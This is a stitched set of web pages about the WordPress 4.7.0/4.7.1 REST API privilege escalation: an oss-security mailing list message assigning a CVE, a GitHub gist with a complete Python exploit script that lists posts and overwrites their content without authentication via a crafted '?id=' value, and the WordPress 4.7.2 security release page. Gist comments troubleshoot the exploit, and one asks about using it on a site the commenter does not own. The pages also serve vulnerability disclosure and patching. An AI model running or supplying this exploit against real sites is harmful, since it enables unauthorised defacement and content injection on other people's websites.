| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](15) [[next>]](17) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <CAKoP-y-E0zLaR5xAPVNa8GjRSTk2RziKsxfQQWWj0tj6sYHb9g@mail.gmail.com>
Date: Fri, 10 Feb 2017 16:14:41 -0600
From: Josh Bressers <josh@...ss.net>
To: Marc-Alexandre Montpas <marc@...uri.net>
Cc: Kurt Seifried <kurt@...fried.org>, oss-security@...ts.openwall.com, dadinolfi@...re.org,
	ccoffin@...re.org
Subject: Re: Asking for a CVE id for the WordPress Privilege Escalation
 vulnerability (4.7/4.7.1)

On Fri, Feb 10, 2017 at 2:18 PM, Marc-Alexandre Montpas <marc@...uri.net>
wrote:

> Hi there,
>
> Per Josh's request, I'm sending the details here.
>
> There was a Privilege Escalation vulnerability in WordPress version 4.7
> and 4.7.1, which allowed attackers to edit any posts on a vulnerable site.
>
> The issue was caused by an inconsistent use of numeric IDs which made it
> possible for an attacker to make use of PHP's type juggling features to
> bypass the privilege check mechanisms put in place.
>
> More information here:  <https://blog.sucuri.net/2017/02/content-injection->
> vulnerability-wordpress-rest-api.html
>
>
>
>
I know this is sort of out of the blue, but it strikes me as very
important, so I'm going to deal with this request right now.

I'm helping Kurt with some DWF tasks and this CVE request showed up. I
can't find a reference to a previous request for this issue, it's also very
high profile and I'm told being exploited in the wild. I'm not seeing a
previous request for the latest wordpress issue. I don't want an assignment
request to wait until after the weekend.

It's #4 on the wordpress site:
<https://wordpress.org/news/2017/01/wordpress-4-7-2-security-release/>

I saw 1-3 had CVE IDs requested on January 27th.

Let's use CVE-2017-1001000 for #4

Thanks.

--
    JB

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from gist.github.com_ebdeca36_20250125_223718.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fleonjza%2F2244eb15510a0687ed93160c623762ab)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fleonjza%2F2244eb15510a0687ed93160c623762ab&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fleonjza%2F2244eb15510a0687ed93160c623762ab) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fleonjza%2F2244eb15510a0687ed93160c623762ab&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@leonjza](https://avatars.githubusercontent.com/u/1148127?s=64&v=4)](/leonjza)

# [leonjza](/leonjza)/**[inject.py](/leonjza/2244eb15510a0687ed93160c623762ab)**

Last active
October 23, 2024 01:06

Show Gist options

* [Download ZIP](/leonjza/2244eb15510a0687ed93160c623762ab/archive/782d88f0e8b63b281fdf33f94525f35cb8392ea5.zip)

* [Star
  32
  (32)](/login?return_to=https%3A%2F%2Fgist.github.com%2Fleonjza%2F2244eb15510a0687ed93160c623762ab)You must be signed in to star a gist
* [Fork
  15
  (15)](/login?return_to=https%3A%2F%2Fgist.github.com%2Fleonjza%2F2244eb15510a0687ed93160c623762ab)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/leonjza/2244eb15510a0687ed93160c623762ab.js&quot;&gt;&lt;/script&gt;
* Save leonjza/2244eb15510a0687ed93160c623762ab to your computer and use it in GitHub Desktop.

[Code](/leonjza/2244eb15510a0687ed93160c623762ab)
[Revisions
10](/leonjza/2244eb15510a0687ed93160c623762ab/revisions)
[Stars
30](/leonjza/2244eb15510a0687ed93160c623762ab/stargazers)
[Forks
15](/leonjza/2244eb15510a0687ed93160c623762ab/forks)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/leonjza/2244eb15510a0687ed93160c623762ab.js&quot;&gt;&lt;/script&gt;

Save leonjza/2244eb15510a0687ed93160c623762ab to your computer and use it in GitHub Desktop.

[Download ZIP](/leonjza/2244eb15510a0687ed93160c623762ab/archive/782d88f0e8b63b281fdf33f94525f35cb8392ea5.zip)

Wordpress 4.7.0/4.7.1 Unauthenticated Content Injection PoC

 [Raw](/leonjza/2244eb15510a0687ed93160c623762ab/raw/782d88f0e8b63b281fdf33f94525f35cb8392ea5/inject.py)

[**inject.py**](#file-inject-py)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | # 2017 - @leonjza |
| --- | --- |
|  | # |
|  | # Wordpress 4.7.0/4.7.1 Unauthenticated Content Injection PoC |
|  | # Full bug description: https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html |
|  |  |
|  | # Usage example: |
|  | # |
|  | # List available posts: |
|  | # |
|  | # $ python inject.py http://localhost:8070/ |
|  | # \* Discovering API Endpoint |
|  | # \* API lives at: http://localhost:8070/wp-json/ |
|  | # \* Getting available posts |
|  | # - Post ID: 1, Title: test, Url: http://localhost:8070/archives/1 |
|  | # |
|  | # Update post with content from a file: |
|  | # |
|  | # $ cat content |
|  | # foo |
|  | # |
|  | # $ python inject.py http://localhost:8070/ 1 content |
|  | # \* Discovering API Endpoint |
|  | # \* API lives at: http://localhost:8070/wp-json/ |
|  | # \* Updating post 1 |
|  | # \* Post updated. Check it out at http://localhost:8070/archives/1 |
|  | # \* Update complete! |
|  |  |
|  | import json |
|  | import sys |
|  | import urllib2 |
|  |  |
|  | from lxml import etree |
|  |  |
|  |  |
|  | def get\_api\_url(wordpress\_url): |
|  | response = urllib2.urlopen(wordpress\_url) |
|  |  |
|  | data = etree.HTML(response.read()) |
|  | u = data.xpath('//link[@rel="https://api.w.org/"]/@href')[0] |
|  |  |
|  | # check if we have permalinks |
|  | if 'rest\_route' in u: |
|  | print(' ! Warning, looks like permalinks are not enabled. This might not work!') |
|  |  |
|  | return u |
|  |  |
|  |  |
|  | def get\_posts(api\_base): |
|  | respone = urllib2.urlopen(api\_base + 'wp/v2/posts') |
|  | posts = json.loads(respone.read()) |
|  |  |
|  | for post in posts: |
|  | print(' - Post ID: {0}, Title: {1}, Url: {2}' |
|  | .format(post['id'], post['title']['rendered'], post['link'])) |
|  |  |
|  |  |
|  | def update\_post(api\_base, post\_id, post\_content): |
|  | # more than just the content field can be updated. see the api docs here: |
|  | # https://developer.wordpress.org/rest-api/reference/posts/#update-a-post |
|  | data = json.dumps({ |
|  | 'content': post\_content |
|  | }) |
|  |  |
|  | url = api\_base + 'wp/v2/posts/{post\_id}/?id={post\_id}abc'.format(post\_id=post\_id) |
|  | req = urllib2.Request(url, data, {'Content-Type': 'application/json'}) |
|  | response = urllib2.urlopen(req).read() |
|  |  |
|  | print('\* Post updated. Check it out at {0}'.format(json.loads(response)['link'])) |
|  |  |
|  |  |
|  | def print\_usage(): |
|  | print('Usage: {0} <url> (optional: <post\_id> <file with post\_content>)'.format(\_\_file\_\_)) |
|  |  |
|  |  |
|  | if \_\_name\_\_ == '\_\_main\_\_': |
|  |  |
|  | # ensure we have at least a url |
|  | if len(sys.argv) < 2: |
|  | print\_usage() |
|  | sys.exit(1) |
|  |  |
|  | # if we have a post id, we need content too |
|  | if 2 < len(sys.argv) < 4: |
|  | print('Please provide a file with post content with a post id') |
|  | print\_usage() |
|  | sys.exit(1) |
|  |  |
|  | print('\* Discovering API Endpoint') |
|  | api\_url = get\_api\_url(sys.argv[1]) |
|  | print('\* API lives at: {0}'.format(api\_url)) |
|  |  |
|  | # if we only have a url, show the posts we have have |
|  | if len(sys.argv) < 3: |
|  | print('\* Getting available posts') |
|  | get\_posts(api\_url) |
|  |  |
|  | sys.exit(0) |
|  |  |
|  | # if we get here, we have what we need to update a post! |
|  | print('\* Updating post {0}'.format(sys.argv[2])) |
|  | with open(sys.argv[3], 'r') as content: |
|  | new\_content = content.readlines() |
|  |  |
|  | update\_post(api\_url, sys.argv[2], ''.join(new\_content)) |
|  |  |
|  | print('\* Update complete!') |

[![@swaggerz500](https://avatars.githubusercontent.com/u/25515974?s=80&v=4)](/swaggerz500)

Copy link

### **[swaggerz500](/swaggerz500)** commented [Feb 2, 2017](/leonjza/2244eb15510a0687ed93160c623762ab?permalink_comment_id=1987174#gistcomment-1987174)

Hi

How do i use this script?

Sorry, something went wrong.

[![@swaggerz500](https://avatars.githubusercontent.com/u/25515974?s=80&v=4)](/swaggerz500)

Copy link

### **[swaggerz500](/swaggerz500)** commented [Feb 2, 2017](/leonjza/2244eb15510a0687ed93160c623762ab?permalink_comment_id=1987175#gistcomment-1987175)

Can i use this on windiws

Sorry, something went wrong.

[![@salacoste](https://avatars.githubusercontent.com/u/12632895?s=80&v=4)](/salacoste)

Copy link

### **[salacoste](/salacoste)** commented [Feb 2, 2017](/leonjza/2244eb15510a0687ed93160c623762ab?permalink_comment_id=1987183#gistcomment-1987183)

Leonjza, what the reason get

File "/System/\*\*\*lib/python2.7/urllib2.py", line 558, in http\_error\_default

raise HTTPError(req.get\_full\_url(), code, msg, hdrs, fp)

urllib2.HTTPError: HTTP Error 404: Not Found

but in clear request to wp-json/wp/v2/posts/1?id=598t..... get 403 error..

Sorry, something went wrong.

[![@reyvand](https://avatars.githubusercontent.com/u/10560278?s=80&v=4)](/reyvand)

Copy link

### **[reyvand](/reyvand)** commented [Feb 3, 2017](/leonjza/2244eb15510a0687ed93160c623762ab?permalink_comment_id=1987344#gistcomment-1987344)

i got this error when i try to test on localhost

urllib2.HTTPError: HTTP Error 400: Bad Request

Sorry, something went wrong.

[![@oddyIT](https://avatars.githubusercontent.com/u/23273470?s=80&v=4)](/oddyIT)

Copy link

### **[oddyIT](/oddyIT)** commented [Feb 3, 2017](/leonjza/2244eb15510a0687ed93160c623762ab?permalink_comment_id=1987362#gistcomment-1987362)

File "inject.py", line 100, in

api\_url = get\_api\_url(sys.argv[1])

File "inject.py", line 47, in get\_api\_url

response = urllib2.urlopen(wordpress\_url)

File "/usr/lib/python2.7/urllib2.py", line 154, in urlopen

return opener.open(url, data, timeout)

File "/usr/lib/python2.7/urllib2.py", line 429, in open

response = self.\_open(req, data)

File "/usr/lib/python2.7/urllib2.py", line 447, in \_open

'\_open', req)

File "/usr/lib/python2.7/urllib2.py", line 407, in \_call\_chain

result = func(\*args)

File "/usr/lib/python2.7/urllib2.py", line 1228, in http\_open

return self.do\_open(httplib.HTTPConnection, req)

File "/usr/lib/python2.7/urllib2.py", line 1198, in do\_open

raise URLError(err)

urllib2.URLError: <urlopen error [Errno 111] Connection refused>

test on ubuntu 16.04

Sorry, something went wrong.

[![@Lucifaer](https://avatars.githubusercontent.com/u/20091153?s=80&v=4)](/Lucifaer)

Copy link

### **[Lucifaer](/Lucifaer)** commented [Feb 3, 2017](/leonjza/2244eb15510a0687ed93160c623762ab?permalink_comment_id=1987442#gistcomment-1987442)

Same problem with others:

Traceback (most recent call last):

File "41223.py", line 115, in

update\_post(api\_url, sys.argv[2], ''.join(new\_content))

File "41223.py", line 77, in update\_post

response = urllib2.urlopen(req).read()

File "/usr/local/Cellar/python/2.7.13/Frameworks/Python.framework/Versions/2.7/lib/python2.7/urllib2.py", line 154, in urlopen

return opener.open(url, data, timeout)

File "/usr/local/Cellar/python/2.7.13/Frameworks/Python.framework/Versions/2.7/lib/python2.7/urllib2.py", line 435, in open

response = meth(req, response)

File "/usr/local/Cellar/python/2.7.13/Frameworks/Python.framework/Versions/2.7/lib/python2.7/urllib2.py", line 548, in http\_response

'http', request, response, code, msg, hdrs)

File "/usr/local/Cellar/python/2.7.13/Frameworks/Python.framework/Versions/2.7/lib/python2.7/urllib2.py", line 473, in error

return self.\_call\_chain(\*args)

File "/usr/local/Cellar/python/2.7.13/Frameworks/Python.framework/Versions/2.7/lib/python2.7/urllib2.py", line 407, in \_call\_chain

result = func(\*args)

File "/usr/local/Cellar/python/2.7.13/Frameworks/Python.framework/Versions/2.7/lib/python2.7/urllib2.py", line 556, in http\_error\_default

raise HTTPError(req.get\_full\_url(), code, msg, hdrs, fp)

urllib2.HTTPError: HTTP Error 400: Bad Request

Sorry, something went wrong.

[![@Lucifaer](https://avatars.githubusercontent.com/u/20091153?s=80&v=4)](/Lucifaer)

Copy link

### **[Lucifaer](/Lucifaer)** commented [Feb 3, 2017](/leonjza/2244eb15510a0687ed93160c623762ab?permalink_comment_id=1987483#gistcomment-1987483)

I‘ve solve the problem by setting apache2.conf:

LoadModule rewrite\_module /usr/lib/apache2/modules/mod\_rewrite.so

<Directory /var/www/>

Options Indexes FollowSymLinks

AllowOverride All

Require all granted

Wish to help

Sorry, something went wrong.

[![@leonjza](https://avatars.githubusercontent.com/u/1148127?s=80&v=4)](/leonjza)

Copy link

Author

### **[leonjza](/leonjza)** commented [Feb 3, 2017](/leonjza/2244eb15510a0687ed93160c623762ab?permalink_comment_id=1987494#gistcomment-1987494)

[@swaggerz500](https://github.com/swaggerz500) I have not tested this on Windows no.

[@oddyIT](https://github.com/oddyIT) looks like the script cant talk to the wordpress site. Hint: Connection refused ;)

Everyone else getting 400 like errors. Permalinks need to be enabled for this to work. If the API resolved to a URL with `rest_route` in it, permalinks are not configured. The exploit \_ heavily relies\_ on the way Wordpress handles urls like these.

Sorry, something went wrong.

[![@salacoste](https://avatars.githubusercontent.com/u/12632895?s=80&v=4)](/salacoste)

Copy link

### **[salacoste](/salacoste)** commented [Feb 3, 2017](/leonjza/2244eb15510a0687ed93160c623762ab?permalink_comment_id=1987502#gistcomment-1987502)

[@leonjza](https://github.com/leonjza) If not enabled (as i understand they not enabled by default,not?), could construct jquery without permalink?

Sorry, something went wrong.

[![@leonjza](https://avatars.githubusercontent.com/u/1148127?s=80&v=4)](/leonjza)

Copy link

Author

### **[leonjza](/leonjza)** commented [Feb 3, 2017](/leonjza/2244eb15510a0687ed93160c623762ab?permalink_comment_id=1987509#gistcomment-1987509)

[@salacoste](https://github.com/salacoste), from my testing, I don't think the bug will be exploitable without permalinks. Of course, if I am wrong, I am more than happy to update the PoC to cater for another case.

Sorry, something went wrong.

[![@watch-dog-man](https://avatars.githubusercontent.com/u/25526966?s=80&v=4)](/watch-dog-man)

Copy link

### **[watch-dog-man](/watch-dog-man)** commented [Feb 3, 2017](/leonjza/2244eb15510a0687ed93160c623762ab?permalink_comment_id=1987636#gistcomment-1987636) • edited Loading

same foul :(

Sorry, something went wrong.

[![@Ahmedhaseeb](https://avatars.githubusercontent.com/u/12259784?s=80&v=4)](/Ahmedhaseeb)

Copy link

### **[Ahmedhaseeb](/Ahmedhaseeb)** commented [Feb 3, 2017](/leonjza/2244eb15510a0687ed93160c623762ab?permalink_comment_id=1987706#gistcomment-1987706)

hi [@leonjza](https://github.com/leonjza) i tested it at my localhost on windows 7 64bit, under WAMP and url\_rewrite enabled and it works fine and changed the post content.

But it only work once... :(

This is output when it works..

E:\Python Projects>wp.py <http://localhost/wp7_test>

* Discovering API Endpoint
* API lives at: <http://localhost/wp7_test/wp-json/>
* Getting available posts

* Post ID: 1, Title: Hello world!, Url: <http://localhost/wp7_test/2017/02/03/hello-world/>

E:\Python Projects>wp.py <http://localhost/wp7_test> 1 abc.txt

* Discovering API Endpoint
* API lives at: <http://localhost/wp7_test/wp-json/>
* Updating post 1
* Post updated. Check it out at <http://localhost/wp7_test/2017/02/03/hello-world/>
* Update complete!

========= Now its giving me the following error ===========

E:\Python Projects>wp.py <http://localhost/wp7_test> 1 abc.txt

* Discovering API Endpoint
* API lives at: <http://localhost/wp7_test/wp-json/>
* Updating post 1

  Traceback (most recent call last):

  File "E:\Python Projects\wp.py", line 77, in

  update\_post(api\_url, sys.argv[2], ''.join(new\_content))

  File "E:\Python Projects\wp.py", line 39, in update\_post

  response = urllib2.urlopen(req).read()

  File "D:\Users\AKPK\Anaconda2\lib\urllib2.py", line 154, in urlopen

  return opener.open(url, data, timeout)

  File "D:\Users\AKPK\Anaconda2\lib\urllib2.py", line 435, in open

  response = meth(req, response)

  File "D:\Users\AKPK\Anaconda2\lib\urllib2.py", line 548, in http\_response

  'http', request, response, code, msg, hdrs)

  File "D:\Users\AKPK\Anaconda2\lib\urllib2.py", line 473, in error

  return self.\_call\_chain(\*args)

  File "D:\Users\AKPK\Anaconda2\lib\urllib2.py", line 407, in \_call\_chain

  result = func(\*args)

  File "D:\Users\AKPK\Anaconda2\lib\urllib2.py", line 556, in http\_error\_default

  raise HTTPError(req.get\_full\_url(), code, msg, hdrs, fp)

  urllib2.HTTPError: HTTP Error 400: Bad Request

Sorry, something went wrong.

[![@leonjza](https://avatars.githubusercontent.com/u/1148127?s=80&v=4)](/leonjza)

Copy link

Author

### **[leonjza](/leonjza)** commented [Feb 3, 2017](/leonjza/2244eb15510a0687ed93160c623762ab?permalink_comment_id=1987781#gistcomment-1987781)

[@Ahmedhaseeb](https://github.com/Ahmedhaseeb) will have to check out your webservers logs to see if there are more details about the error I think.

Sorry, something went wrong.

[![@swaggerz500](https://avatars.githubusercontent.com/u/25515974?s=80&v=4)](/swaggerz500)

Copy link

### **[swaggerz500](/swaggerz500)** commented [Feb 3, 2017](/leonjza/2244eb15510a0687ed93160c623762ab?permalink_comment_id=1987829#gistcomment-1987829)

How do you find post id of the link? What perma link does it havw to be?

Sorry, something went wrong.

[![@leonjza](https://avatars.githubusercontent.com/u/1148127?s=80&v=4)](/leonjza)

Copy link

Author

### **[leonjza](/leonjza)** commented [Feb 4, 2017](/leonjza/2244eb15510a0687ed93160c623762ab?permalink_comment_id=1988352#gistcomment-1988352)

[@swaggerz500](https://github.com/swaggerz500) run the script with only the url as argument, and it will print posts and id's for you. just like the example usage comment shows

Sorry, something went wrong.

[![@sunbyte](https://avatars.githubusercontent.com/u/19614787?s=80&v=4)](/sunbyte)

Copy link

### **[sunbyte](/sunbyte)** commented [Feb 8, 2017](/leonjza/2244eb15510a0687ed93160c623762ab?permalink_comment_id=1991804#gistcomment-1991804)

Sorry my friend, but this "exploit" is total crap!

Such a mess between python2 and python3 code.

I still wonder how is possible to write such a bad script with powerful language like Python...

This exploit will NEVER work on any OS without tons of modifications.

Sorry, something went wrong.

[![@leonjza](https://avatars.githubusercontent.com/u/1148127?s=80&v=4)](/leonjza)

Copy link

Author

### **[leonjza](/leonjza)** commented [Feb 8, 2017](/leonjza/2244eb15510a0687ed93160c623762ab?permalink_comment_id=1991853#gistcomment-1991853)

[@sunbyte](https://github.com/sunbyte) thanks for your constructive feedback!

Sorry, something went wrong.

[![@unixfox](https://avatars.githubusercontent.com/u/4016501?s=80&v=4)](/unixfox)

Copy link

### **[unixfox](/unixfox)** commented [Feb 8, 2017](/leonjza/2244eb15510a0687ed93160c623762ab?permalink_comment_id=1991865#gistcomment-1991865)

I'm getting `IndexError: list index out of range` on my local non-patched wordpress blog:

```
* Discovering API Endpoint
Traceback (most recent call last):
  File "wordpress.py", line 100, in <module>
    api_url = get_api_url(sys.argv[1])
  File "wordpress.py", line 50, in get_api_url
    u = data.xpath('//link[@rel="https://api.w.org/"]/@href')[0]
IndexError: list index out of range

```

Where does this error come from?

Sorry, something went wrong.

[![@leonjza](https://avatars.githubusercontent.com/u/1148127?s=80&v=4)](/leonjza)

Copy link

Author

### **[leonjza](/leonjza)** commented [Feb 8, 2017](/leonjza/2244eb15510a0687ed93160c623762ab?permalink_comment_id=1991876#gistcomment-1991876) • edited Loading

[@unixfox](https://github.com/unixfox) That means it couldnt parse the API URL from the URI you specified. The script checks for a link tag with a rel of api.w.org. You could view the source of the wordpress page and check if its there and update the script if its somewhere else.

Sorry, something went wrong.

[![@Rivendall](https://avatars.githubusercontent.com/u/19299691?s=80&v=4)](/Rivendall)

Copy link

### **[Rivendall](/Rivendall)** commented [Feb 11, 2017](/leonjza/2244eb15510a0687ed93160c623762ab?permalink_comment_id=1994653#gistcomment-1994653)

Hello [@leonjza](https://github.com/leonjza). Thank you.

I tested it at my localhost on windows 7 32bit, under XAMPP for WP 4.7.1.

But I had error:

C:\Python>inject.py <http://localhost/cms/wp7test/>

* Discovering API Endpoint
* API lives at: <http://localhost/cms/wp7test/wp-json/>
* Getting available posts

* Post ID: 1, Title: Hello world!, Url: <http://localhost/cms/wp7test/2017/02/08>

  /hello-world/

Then:

C:\Python>inject.py <http://localhost/cms/wp7test/> 1 abc.txt

* Discovering API Endpoint
* API lives at: <http://localhost/cms/wp7test/wp-json/>
* Updating post 1

  Traceback (most recent call last):

  File "C:\Python\inject.py", line 102, in

  update\_post(api\_url, sys.argv[2], ''.join(new\_content))

  File "C:\Python\inject.py", line 66, in update\_post

  response = urllib2.urlopen(req).read()

  File "C:\Python\lib\urllib2.py", line 154, in urlopen

  return opener.open(url, data, timeout)

  File "C:\Python\lib\urllib2.py", line 437, in open

  response = meth(req, response)

  File "C:\Python\lib\urllib2.py", line 550, in http\_response

  'http', request, response, code, msg, hdrs)

  File "C:\Python\lib\urllib2.py", line 475, in error

  return self.\_call\_chain(\*args)

  File "C:\Python\lib\urllib2.py", line 409, in \_call\_chain

  result = func(\*args)

  File "C:\Python\lib\urllib2.py", line 558, in http\_error\_default

  raise HTTPError(req.get\_full\_url(), code, msg, hdrs, fp)

  urllib2.HTTPError: HTTP Error 400: Bad Request

Please help me. Thank you.

Sorry, something went wrong.

[![@komradz86](https://avatars.githubusercontent.com/u/25012489?s=80&v=4)](/komradz86)

Copy link

### **[komradz86](/komradz86)** commented [Apr 21, 2017](/leonjza/2244eb15510a0687ed93160c623762ab?permalink_comment_id=2069510#gistcomment-2069510) • edited Loading

[@unixfox](https://github.com/unixfox) That means it couldnt parse the API URL from the URI you specified. The script checks for a link tag with a rel of api.w.org. You could view the source of the wordpress page and check if its there and update the script if its somewhere else.

can you explain more?

what if the website does not belong to me and i cant see the script? where do usualy the API is located

Sorry, something went wrong.

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Fleonjza%2F2244eb15510a0687ed93160c623762ab)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from codex.wordpress.org_33f9c1b1_20250125_223716.html ===


[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Showcase](https://wordpress.org/showcase/)
* [Hosting](https://wordpress.org/hosting/)
* Extend
  + [Themes](https://wordpress.org/themes/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Blocks](https://wordpress.org/blocks/)
  + [Openverse ↗︎](https://openverse.org/)
* Learn
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* Community
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [Events](https://events.wordpress.org/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* About
  + [About WordPress](https://wordpress.org/about/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
* [Get WordPress](https://wordpress.org/download/)

Search in WordPress.org

[Get WordPress](https://wordpress.org/download/)

[WordPress.org](https://wordpress.org/)

[Documentation](https://wordpress.org/documentation)

Version 4.7.2

* [WordPress Overview](https://wordpress.org/documentation/overview/)
* [Technical Guides](https://wordpress.org/documentation/technical-guides/)
* [Support Guides](https://wordpress.org/documentation/support-guides/)
* [Customization](https://wordpress.org/documentation/customization/)
* [Get Involved](https://make.wordpress.org/docs/)

* [WordPress Overview](https://wordpress.org/documentation/overview/)
* [Technical Guides](https://wordpress.org/documentation/technical-guides/)
* [Support Guides](https://wordpress.org/documentation/support-guides/)
* [Customization](https://wordpress.org/documentation/customization/)
* [Get Involved](https://make.wordpress.org/docs/)

[Home](https://wordpress.org/documentation)Version 4.7.2

Search documentation

# Version 4.7.2

[↑ Back to top](#wp--skip-link--target)

From the [WordPress 4.7.2 release post](https://wordpress.org/news/2017/01/wordpress-4-7-2-security-release/): WordPress versions 4.7.1 and earlier are affected by three security issues:

1. The user interface for assigning taxonomy terms in Press This is shown to users who do not have permissions to use it. Reported by David Herrera of [Alley Interactive](https://www.alleyinteractive.com/).
2. `WP_Query` is vulnerable to a SQL injection (SQLi) when passing unsafe data. WordPress core is not directly vulnerable to this issue, but we’ve added hardening to prevent plugins and themes from accidentally causing a vulnerability. Reported by [Mo Jangda](https://github.com/mjangda)(batmoo).
3. A cross-site scripting (XSS) vulnerability was discovered in the posts list table. Reported by [Ian Dunn](https://iandunn.name/) of the WordPress Security Team.

From the [additional 4.7.2 security disclosure](https://make.wordpress.org/core/2017/02/01/disclosure-of-additional-security-fix-in-wordpress-4-7-2/), WordPress versions 4.7.0 and 4.7.1 are affected by the following security issue:

1. There was an *Unauthenticated Privilege Escalation Vulnerability in a REST API Endpoint*. Previous versions of WordPress, even with the REST API Plugin, were never vulnerable to this. Reported by [Marc-Alexandre Montpas](https://twitter.com/MarcS0h) of [Sucuri](https://sucuri.net/).

```
 wp-admin/about.php
 wp-admin/includes/class-wp-press-this.php
 wp-admin/includes/class-wp-posts-list-table.php
 wp-includes/version.php
 wp-includes/class-wp-query.php
 wp-includes/class-wp-comment.php
 wp-includes/class-wp-term.php
 wp-includes/rest-api/endpoints/class-wp-rest-comments-controller.php
 wp-includes/rest-api/endpoints/class-wp-rest-taxonomies-controller.php
 wp-includes/rest-api/endpoints/class-wp-rest-post-types-controller.php
 wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php
 wp-includes/rest-api/endpoints/class-wp-rest-terms-controller.php
 wp-includes/rest-api/endpoints/class-wp-rest-post-statuses-controller.php
 wp-includes/rest-api/endpoints/class-wp-rest-revisions-controller.php
 wp-includes/rest-api/endpoints/class-wp-rest-users-controller.php
 wp-includes/class-wp-post.php
 wp-includes/rest-api.php
```

First published

January 15, 2019

Last updated

## Get more help

[Support forums](https://wordpress.org/support/forums/)

Ask questions in the support forums.

[Developers](https://developer.wordpress.org/)

Check out the developer documentation.

[Content suggestions](https://github.com/WordPress/Documentation-Issue-Tracker/issues)

Report an error or change in the documentation issue tracker.

[Get involved](https://make.wordpress.org/docs/)

Learn about the Documentation Team and how to contribute.

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Privacy](https://wordpress.org/about/privacy/)

* [Showcase](https://wordpress.org/showcase/)
* [Themes](https://wordpress.org/themes/)
* [Plugins](https://wordpress.org/plugins/)
* [Patterns](https://wordpress.org/patterns/)

* [Learn](https://learn.wordpress.org/)
* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
